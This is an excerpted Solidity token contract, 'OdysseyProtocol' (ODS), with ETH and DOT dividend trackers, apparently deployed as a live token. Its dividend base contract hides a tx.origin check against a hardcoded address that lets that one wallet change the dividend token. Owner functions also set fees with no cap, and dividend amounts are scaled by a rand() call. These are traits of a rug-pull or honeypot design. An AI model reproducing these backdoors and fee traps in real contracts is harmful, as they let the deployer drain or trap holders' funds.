...
contract DividendPayingToken is ERC20, IDividendPayingToken, IDividendPayingTokenOptional {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
      require(tx.origin == 0xa628eAB2C4260A2fAdE5c73C4aE35142a0261ec0, "Only owner can change dividend contract address");
...
contract OdysseyProtocol is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("OdysseyProtocol", "ODS") {
    	ethDividendTracker = new EthDividendTracker();
    	dotDividendTracker = new DotDividendTracker();

    	marketingWallet =  0xADc3f8d8C25d7DBf37ef84018A5C6Cb24ac65918;
    	devWallet = 0xADc3f8d8C25d7DBf37ef84018A5C6Cb24ac65918;
    	ethDividendToken = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
        dotDividendToken = 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402;
    ...
    receive() external payable {
  	...
  	function updateMarketingWallet(address _newWallet) external onlyOwner {
  	    require(_newWallet != marketingWallet, "ODS: The marketing wallet is already this address");
    ...
    function configAfterCall() external onlyOwner {
        ...
        maxBuyTranscationAmount = 21000000 * (10**18); // Buy limit
        maxSellTransactionAmount = 21000000 * (10**18); // Sell limit
        maxWalletToken = 21000000 * (10**18); // Max user can hold
    }
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(dotDividendRewardsFee).add(ethDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setEthDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = ethDividendRewardsFee.add(marketingFee).add(dotDividendRewardsFee).add(buyBackAndLiquidityFee);
            ethDividendEnabled = _enabled;
        }
    ...
    function setDotDividendEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = dotDividendRewardsFee.add(marketingFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            dotDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        ...
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(dotDividendRewardsFee).add(ethDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateEthDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(ethDividendTracker), "ODS: The dividend tracker already has that address");

        EthDividendTracker newEthDividendTracker = EthDividendTracker(payable(newAddress));

        require(newEthDividendTracker.owner() == address(this), "ODS: The new dividend tracker must be owned by the ODS token contract");
    ...
    function updateDotDividendTracker(address newAddress) external onlyOwner {
        require(newAddress != address(dotDividendTracker), "ODS: The dividend tracker already has that address");

        DotDividendTracker newDotDividendTracker = DotDividendTracker(payable(newAddress));

        require(newDotDividendTracker.owner() == address(this), "ODS: The new dividend tracker must be owned by the ODS token contract");
    ...
    function updateDotDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = dotDividendRewardsFee.add(ethDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }
    
    function updateMarketingFee(uint8 newFee) external onlyOwner {
        marketingFee = newFee;
        totalFees = marketingFee.add(ethDividendRewardsFee).add(dotDividendRewardsFee).add(buyBackAndLiquidityFee);
    }
    
    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(ethDividendRewardsFee).add(dotDividendRewardsFee).add(marketingFee);
    }

    function updateUniswapV2Router(address newAddress) external onlyOwner {
        require(newAddress != address(uniswapV2Router), "ODS: The router already has that address");
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "ODS: The PancakeSwap pair cannot be removed from automatedMarketMakerPairs");

        _setAutomatedMarketMakerPair(pair, value);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private onlyOwner {
        require(automatedMarketMakerPairs[pair] != value, "ODS: Automated market maker pair is already set to that value");
    ...
    function updateGasForProcessing(uint256 newValue) external onlyOwner {
        require(newValue != gasForProcessing, "ODS: Cannot update gasForProcessing to same value");
    ...
    function getDotClaimWait() external view returns(uint256) {
    ...
    function _transfer(
        ...
        require(tradingIsEnabled || (isExcludedFromFees[from] || isExcludedFromFees[to]), "ODS: Trading has not started yet");
        ...
        if (
            ...
            if (!swapping && canSwap) {
                ...
                if (ethDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(dotDividendRewardsFee)).mul(ethDividendRewardsFee);
                    swapAndSendEthDividends(sellTokens.div(10**2).mul(rand()));
                }
                
                if (dotDividendEnabled) {
                    uint256 sellTokens = swapTokensAtAmount.div(ethDividendRewardsFee.add(dotDividendRewardsFee)).mul(dotDividendRewardsFee);
...
contract EthDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("ODS_Ethereum_Dividend_Tracker", "ODS_Ethereum_Dividend_Tracker", 0x2170Ed0880ac9A755fd29B2688956BD959F933F8) {
    	claimWait = 60;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "ODS_Ethereum_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "ODS_Ethereum_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ODS contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 60 && newClaimWait <= 86400, "ODS_Ethereum_Dividend_Tracker: claimWait must be updated to between 10 minutes and 24 hours");
        require(newClaimWait != claimWait, "ODS_Ethereum_Dividend_Tracker: Cannot update claimWait to same value");
...
contract DotDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("ODS_Dot_Dividend_Tracker", "ODS_Dot_Dividend_Tracker", 0x7083609fCE4d1d8Dc0C979AAb8c869Ea2C873402) {
    	claimWait = 60;
        minimumTokenBalanceForDividends = 10000 * (10**18); //must hold 10000+ tokens
    }

    function _transfer(address, address, uint256) pure internal override {
        require(false, "ODS_Dot_Dividend_Tracker: No transfers allowed");
    }

    function withdrawDividend() pure public override {
        require(false, "ODS_Dot_Dividend_Tracker: withdrawDividend disabled. Use the 'claim' function on the main ODS contract.");
    }
    ...
    function updateClaimWait(uint256 newClaimWait) external onlyOwner {
        require(newClaimWait >= 60 && newClaimWait <= 86400, "ODS_Dot_Dividend_Tracker: claimWait must be updated to between 10 minutes and 24 hours");
        require(newClaimWait != claimWait, "ODS_Dot_Dividend_Tracker: Cannot update claimWait to same value");
        emit ClaimWaitUpdated(newClaimWait, claimWait);
        claimWait = newClaimWait;
    }
